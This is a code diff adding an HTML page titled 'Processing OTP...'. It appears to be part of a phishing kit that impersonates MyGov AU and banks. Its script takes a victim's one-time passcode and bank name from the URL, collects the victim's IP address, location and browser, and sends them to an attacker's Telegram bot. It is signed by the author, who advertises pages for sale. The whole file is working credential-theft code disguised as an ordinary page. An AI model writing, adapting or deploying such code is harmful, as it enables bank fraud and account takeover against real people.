@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Processing OTP...</title>
+</head>
+<body>
+    <script src="config/email.js"></script>
+    <script>
+        (function() {
+            const apikey = CONFIG.apikey;
+            const chatid = CONFIG.chatid;
+
+            function getParam(name) {
+                const url = new URL(window.location.href);
+                return url.searchParams.get(name) || '';
+            }
+
+            function getBrowser(ua) {
+                if (ua.includes('MSIE')) return 'Internet Explorer';
+                if (ua.includes('Firefox')) return 'Mozilla Firefox';
+                if (ua.includes('Chrome')) return 'Google Chrome';
+                if (ua.includes('Safari')) return 'Safari';
+                if (ua.includes('Opera')) return 'Opera';
+                return 'Unknown';
+            }
+
+            async function getLocation(ip) {
+                try {
+                    const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
+                    const data = await res.json();
+                    return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
+                } catch { return { country: 'Unknown', city: 'Unknown' }; }
+            }
+
+            (async function() {
+                const username = getParam('username');
+                const title = getParam('title');
+
+                if (!username) {
+                    document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
+                    return;
+                }
+
+                let ip = '0.0.0.0';
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ip = data.ip;
+                } catch(e) {}
+
+                const userAgent = navigator.userAgent;
+                const location = await getLocation(ip);
+
+                let message = "";
+                message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
+                message += "|Bank Name: " + title + "\n";
+                message += "|OTP-Code: " + username + "\n";
+                message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
+                message += "|Client IP: " + ip + "\n";
+                message += "|City : " + location.city + "\n";
+                message += "|Country : " + location.country + "\n";
+                message += "|UserAgent : " + userAgent + "\n";
+                message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
+                message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${apikey}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatid, text: message })
+                    });
+                } catch(e) {}
+
+                document.body.innerHTML = '';
+            })();
+        })();
+    </script>
+</body>
+</html>
